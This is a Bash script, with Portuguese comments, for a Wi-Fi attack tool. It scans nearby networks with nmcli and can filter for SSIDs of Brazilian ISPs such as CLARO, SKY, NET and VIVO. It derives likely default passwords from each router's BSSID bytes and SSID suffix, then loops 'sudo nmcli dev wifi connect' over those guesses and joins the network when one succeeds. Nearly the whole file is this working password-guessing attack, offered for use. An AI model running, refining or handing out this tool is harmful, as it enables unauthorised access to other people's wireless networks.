#!/bin/bash

# Constantes para facilitar a utilização das cores
GREEN='\033[32;1m'
BLUE='\033[34;1m'
RED='\033[31;1m'
RED_BLINK='\033[31;5;1m'
END='\033[m'

# Função chamada quando cancelar o programa com [Ctrl]+[c]
trap __Ctrl_c__ INT

__Ctrl_c__() {
   # __Clear__
    rm -rf password* ssid* bssid* temp*
    echo " "
    printf "\n${RED_BLINK} [!] Aborted task!${END}\n\n"
    exit 1
}

# Remove temp files de uma execução anterior
rm -rf password* ssid* bssid* temp*

# Banner
clear
echo " "
echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
echo -e "${RED}            https://github.com/caique-garbim  ${END}"
echo " "
echo -e " This tool searches for nearby Wi-Fi networks and performs"
echo -e " authentication attempts on the networks based on default"
echo -e "          passwords defined by the manufacturer."
echo " "
echo -e "${GREEN} [1]${END}${BLUE} Search for ${RED}potentially vulnerable${END}${BLUE} Wi-Fi networks${END}"
echo -e "${GREEN} [2]${END}${BLUE} Search ${RED}all${END}${BLUE} Wi-Fi networks${END}"
echo " "

# Lê a opção escolhida
echo -ne " ${GREEN}Option > ${END}"
read menu

# Primeira opção
if [ $menu == "1" ]
then
	# Banner
	clear
	echo " "
	echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
	echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
	echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
	echo -e "${RED}            https://github.com/caique-garbim  ${END}"
	echo " "
	echo -e " This tool searches for nearby Wi-Fi networks and performs"
	echo -e " authentication attempts on the networks based on default"
	echo -e "          passwords defined by the manufacturer."
	echo " "
	echo -e "${BLUE} [*] Searching...${END}"
	echo " "
	# Nmcli busca por redes wifi e joga a saída para temp.txt
	nmcli -g bssid,ssid dev wifi | egrep "CLARO\_|SKY\_|NET\_|VIVO\-|VIVOFIBRA\-" | grep -v "\#NET" > temp.txt
	# Sed limpa o temp.txt e salva em temp1.txt
	cat temp.txt | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' > temp1.txt
	# Remove o temp.txt
	rm -rf temp.txt
	# Separa o SSID em um arquivo
	cat temp1.txt | cut -d ":" -f7 | cut -d " " -f1 > ssid.txt
	# Separa o BSSID em um arquivo
	cat temp1.txt | cut -d ":" -f1,2,3,4,5,6 > bssid.txt
	# Variavel QtdWifi recebe a quantidade de redes encontradas
	QtdWifi=$(cat temp1.txt | wc -l)
	# Remove o temp1.txt
	rm -rf temp1.txt
	
	# Monta menu para o usuário escolher
	seq $QtdWifi > temp.txt
	for i in $(cat temp.txt)
	do
		echo " [$i]" >> temp1.txt;
	done
	rm -rf temp.txt
	# Lista WiFis possivelmente vulneráveis no menu
	paste -d ' ' temp1.txt ssid.txt
	echo -e " ${BLUE}[99] Back ${END}"
	echo " "
	
	# Usuario escolhe o WiFi para atacar
	echo -ne " ${GREEN}Attack > ${END}"
	read wifi
	
	# Caso o usuário quiser voltar ao menu
	if [ $wifi == "99" ]
	then
		./$0
	fi
	
	# Separa o WiFi escolhido para atacar
	cat ssid.txt | head -n$wifi | tail -n1 > ssid_atk.txt
	cat bssid.txt | head -n$wifi | tail -n1 > bssid_atk.txt
	
	# Banner
	clear
	echo " "
	echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
	echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
	echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
	echo -e "${RED}            https://github.com/caique-garbim  ${END}"
	echo " "
	echo -e " This tool searches for nearby Wi-Fi networks and performs"
	echo -e " authentication attempts on the networks based on default"
	echo -e "          passwords defined by the manufacturer."
	echo " "
	echo -ne "${GREEN} [+] SSID:  "
	cat ssid_atk.txt
	echo -ne "${GREEN} [+] BSSID: "
	cat bssid_atk.txt
	echo -e "${END}"
	
	# Monta a mini wordlist
	# 3º byte em diante
	cat bssid_atk.txt | cut -d ":" -f3,4,5,6 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > password_atk.txt
	# 2º byte em diante
	cat bssid_atk.txt | cut -d ":" -f2,3,4,5,6 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> password_atk.txt
	# 1º byte em diante
	cat bssid_atk.txt | cut -d ":" -f1,2,3,4,5,6 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> password_atk.txt
	# Alterando o último byte (3º byte em diante)
	cat ssid_atk.txt | sed 's/_ext//' | sed 's/_Ext//' | cut -d "_" -f2 | rev | cut -c 1,2 | rev > temp_newbyte.txt
	cat bssid_atk.txt | cut -d ":" -f3,4,5 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > temp_bssidclean.txt
	paste -d '' temp_bssidclean.txt temp_newbyte.txt >> password_atk.txt
	# Alterando o último byte (2º byte em diante)
	cat ssid_atk.txt | sed 's/_ext//' | sed 's/_Ext//' | cut -d "_" -f2 | rev | cut -c 1,2 | rev > temp_newbyte.txt
	cat bssid_atk.txt | cut -d ":" -f2,3,4,5 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > temp_bssidclean.txt
	paste -d '' temp_bssidclean.txt temp_newbyte.txt >> password_atk.txt
	# Alterando o último byte (1º byte em diante)
	cat ssid_atk.txt | sed 's/_ext//' | sed 's/_Ext//' | cut -d "_" -f2 | rev | cut -c 1,2 | rev > temp_newbyte.txt
	cat bssid_atk.txt | cut -d ":" -f1,2,3,4,5 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' |sed 's/://' | sed 's/://' | sed 's/://' > temp_bssidclean.txt
	paste -d '' temp_bssidclean.txt temp_newbyte.txt >> password_atk.txt
	
	# Exibe a wordlist
	echo -e "${BLUE} [*] Passwords to try ${END}"
	paste -d ' ' /dev/null password_atk.txt
	
	# Inicia as tentativas de autenticação
	echo " "
	echo -e "${RED} [*] Attacking${END}${RED_BLINK}...${END}"
	rm -rf password.txt
	
	SSID=$(cat ssid_atk.txt)
	for pass in $(cat password_atk.txt)
	do
		sudo nmcli dev wifi connect $SSID password $pass >> password.txt;
		cat password.txt | grep '-' > temp.txt
		OK=$(cat temp.txt | wc -l)
		
		# Caso conseguir fazer a autenticação
		if [ $OK == "1" ]
		then
			echo " "
			echo -e "${GREEN} [+] Found password: $pass ${END}"
			echo " "
			echo -e "${BLUE} [*] Connecting...${END}"
			sudo nmcli dev wifi connect $SSID password $pass >/dev/null
			echo " "
			echo -e "${BLUE} [*] Removing temp files...${END}"
			rm -rf password* ssid* bssid* temp*
			echo -e "${BLUE} [*] Exiting...${END}"
			echo " "
			exit
		fi	
	done
	
	# Caso não conseguir fazer a autenticação
	echo " "
	echo -e "${RED} [!] Password not found.${END}"
	echo -e "${BLUE} [*] Removing temp files...${END}"
	rm -rf password* ssid* bssid* temp*
	echo -e "${BLUE} [*] Exiting...${END}"
	echo " "
	exit
fi

# Segunda opção
if [ $menu == "2" ]
then
	# Banner
	clear
	echo " "
	echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
	echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
	echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
	echo -e "${RED}            https://github.com/caique-garbim  ${END}"
	echo " "
	echo -e " This tool searches for nearby Wi-Fi networks and performs"
	echo -e " authentication attempts on the networks based on default"
	echo -e "          passwords defined by the manufacturer."
	echo " "
	echo -e "${BLUE} [*] Searching...${END}"
	echo " "
	# Nmcli busca por redes wifi e joga a saída para temp.txt
	nmcli -g bssid,ssid dev wifi | grep -v "\#NET" > temp.txt
	# Sed limpa o temp.txt e salva em temp1.txt
	cat temp.txt | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' > temp1.txt
	# Remove o temp.txt
	rm -rf temp.txt
	# Separa o SSID em um arquivo
	cat temp1.txt | cut -d ":" -f7 > ssid.txt
	# Separa o BSSID em um arquivo
	cat temp1.txt | cut -d ":" -f1,2,3,4,5,6 > bssid.txt
	# Variavel QtdWifi recebe a quantidade de redes encontradas
	QtdWifi=$(cat temp1.txt | wc -l)
	# Remove o temp1.txt
	rm -rf temp1.txt
	
	# Monta menu para o usuário escolher
	seq $QtdWifi > temp.txt
	for i in $(cat temp.txt)
	do
		echo " [$i]" >> temp1.txt;
	done
	rm -rf temp.txt
	# Lista WiFis no menu
	paste -d ' ' temp1.txt ssid.txt
	echo -e " ${BLUE}[99] Back ${END}"
	echo " "
	
	# Usuario escolhe o WiFi para atacar
	echo -ne " ${GREEN}Attack > ${END}"
	read wifi
	
	# Caso o usuário quiser voltar ao menu
	if [ $wifi == "99" ]
	then
		./$0
	fi
	
	# Separa o WiFi escolhido para atacar
	cat ssid.txt | head -n$wifi | tail -n1 > ssid_atk.txt
	cat bssid.txt | head -n$wifi | tail -n1 > bssid_atk.txt
	
	# Banner
	clear
	echo " "
	echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
	echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
	echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
	echo -e "${RED}            https://github.com/caique-garbim  ${END}"
	echo " "
	echo -e " This tool searches for nearby Wi-Fi networks and performs"
	echo -e " authentication attempts on the networks based on default"
	echo -e "          passwords defined by the manufacturer."
	echo " "
	echo -ne "${GREEN} [+] SSID:  "
	cat ssid_atk.txt
	echo -ne "${GREEN} [+] BSSID: "
	cat bssid_atk.txt
	echo -e "${END}"
	
	# Monta a mini wordlist
	# 3º byte em diante
	cat bssid_atk.txt | cut -d ":" -f3,4,5,6 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > password_atk.txt
	# 2º byte em diante
	cat bssid_atk.txt | cut -d ":" -f2,3,4,5,6 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> password_atk.txt
	# 1º byte em diante
	cat bssid_atk.txt | cut -d ":" -f1,2,3,4,5,6 > bssid_atk1.txt && cat bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> password_atk.txt
	
	# Exibe a wordlist
	echo -e "${BLUE} [*] Passwords to try ${END}"
	paste -d ' ' /dev/null password_atk.txt
	
	# Inicia as tentativas de autenticação
	echo " "
	echo -e "${RED} [*] Attacking${END}${RED_BLINK}...${END}"
	rm -rf password.txt
	
	SSID=$(cat ssid_atk.txt)
	for pass in $(cat password_atk.txt)
	do
		sudo nmcli dev wifi connect $SSID password $pass >> password.txt;
		cat password.txt | grep '-' > temp.txt
		OK=$(cat temp.txt | wc -l)
		
		# Caso conseguir fazer a autenticação
		if [ $OK == "1" ]
		then
			echo " "
			echo -e "${GREEN} [+] Found password: $pass ${END}"
			echo " "
			echo -e "${BLUE} [*] Connecting...${END}"
			sudo nmcli dev wifi connect $SSID password $pass >/dev/null
			echo " "
			echo -e "${BLUE} [*] Removing temp files...${END}"
			rm -rf password* ssid* bssid* temp*
			echo -e "${BLUE} [*] Exiting...${END}"
			echo " "
			exit
		fi	
	done
	
	# Caso não conseguir fazer a autenticação
	echo " "
	echo -e "${RED} [!] Password not found.${END}"
	echo -e "${BLUE} [*] Removing temp files...${END}"
	rm -rf password* ssid* bssid* temp*
	echo -e "${BLUE} [*] Exiting...${END}"
	echo " "
	exit
fi

# Caso o usuário não escolher 1 nem 2 re-executa o script
rm -rf password* ssid* bssid* temp*
./$0
